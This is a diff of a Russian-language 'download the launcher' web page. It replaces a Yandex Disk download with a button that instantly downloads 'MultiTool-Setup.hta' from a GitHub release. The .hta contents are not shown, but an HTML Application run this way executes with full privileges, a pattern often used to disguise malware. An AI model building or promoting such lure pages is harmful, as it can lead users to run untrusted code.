@@ -15,12 +15,7 @@
             --border-color: #1f2933;
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Montserrat', sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
 
         body {
             background-color: var(--bg-color);
@@ -36,12 +31,8 @@
         /* --- АНИМИРОВАННЫЙ ФОН (СЕТКА И КУБИКИ) --- */
         .background-container {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            overflow: hidden;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0; overflow: hidden;
             background-image: 
                 linear-gradient(to right, rgba(0, 255, 102, 0.05) 1px, transparent 1px),
                 linear-gradient(to bottom, rgba(0, 255, 102, 0.05) 1px, transparent 1px);
@@ -90,7 +81,6 @@
             letter-spacing: 1px;
         }
 
-        /* Кнопка скачивания */
         .download-btn {
             display: block;
             width: 100%;
@@ -115,11 +105,8 @@
             transform: translateY(-2px);
         }
 
-        .download-btn:active {
-            transform: translateY(1px);
-        }
+        .download-btn:active { transform: translateY(1px); }
         
-        /* Стиль для текста загрузки */
         .loading-text {
             display: none;
             margin-top: 15px;
@@ -130,7 +117,6 @@
 </head>
 <body>
 
-    <!-- АНИМИРОВАННЫЙ ФОН -->
     <div class="background-container">
         <div class="cube cube-1"></div>
         <div class="cube cube-2"></div>
@@ -139,60 +125,42 @@
         <div class="cube cube-5"></div>
     </div>
 
-    <!-- ЦЕНТРАЛЬНАЯ КНОПКА -->
     <div class="download-box">
         <h1>Скачать Лаунчер</h1>
         
-        <!-- Кнопка теперь вызывает JS функцию -->
         <a href="#" onclick="startDownload(event)" class="download-btn" id="downloadBtn">
             Скачать
         </a>
-        <div class="loading-text" id="loadingText">Подготовка файла к скачиванию...</div>
+        <div class="loading-text" id="loadingText">Начинаем скачивание...</div>
     </div>
 
-    <!-- СКРИПТ ДЛЯ ПРЯМОГО СКАЧИВАНИЯ -->
     <script>
-        async function startDownload(event) {
-            event.preventDefault(); // Отменяем стандартный переход по ссылке
+        function startDownload(event) {
+            event.preventDefault();
             
             const btn = document.getElementById('downloadBtn');
             const loading = document.getElementById('loadingText');
-            const publicKey = 'https://disk.yandex.ru/d/88DfPU-0YN_8ew';
             
-            // Меняем текст кнопки
+            // ⚠️ ВСТАВЬТЕ СЮДА ССЫЛКУ, КОТОРУЮ СКОПИРОВАЛИ С GITHUB ⚠️
+            // Пример: const downloadUrl = 'https://github.com/GameGG959/installer/releases/download/v1.0/MultiTool-Setup.hta';
+            const downloadUrl = 'https://github.com/GameGG959/installer/releases/download/v1.0/MultiTool-Setup.hta'; 
+            
             btn.innerText = 'Загрузка...';
             loading.style.display = 'block';
 
-            try {
-                // Запрос к API Яндекс.Диска для получения прямой ссылки
-                const response = await fetch(`https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key=${encodeURIComponent(publicKey)}`);
-                const data = await response.json();
-
-                if (data.href) {
-                    // Если API вернул прямую ссылку, скачиваем файл
-                    const a = document.createElement('a');
-                    a.href = data.href;
-                    a.download = ''; 
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    
-                    // Возвращаем кнопку в исходное состояние
-                    btn.innerText = 'Скачать';
-                    loading.innerText = 'Скачивание началось!';
-                    setTimeout(() => loading.style.display = 'none', 3000);
-                } else {
-                    // Если это папка (API не дает прямых ссылок на папки), открываем в новой вкладке
-                    window.open(publicKey, '_blank');
-                    btn.innerText = 'Скачать';
-                    loading.style.display = 'none';
-                }
-            } catch (error) {
-                // В случае ошибки просто открываем страницу
-                window.open(publicKey, '_blank');
+            // Создаем невидимую ссылку и кликаем по ней для мгновенного скачивания
+            const a = document.createElement('a');
+            a.href = downloadUrl;
+            a.download = ''; 
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            // Возвращаем кнопку обратно через 2 секунды
+            setTimeout(() => {
                 btn.innerText = 'Скачать';
                 loading.style.display = 'none';
-            }
+            }, 2000);
         }
     </script>
 </body>
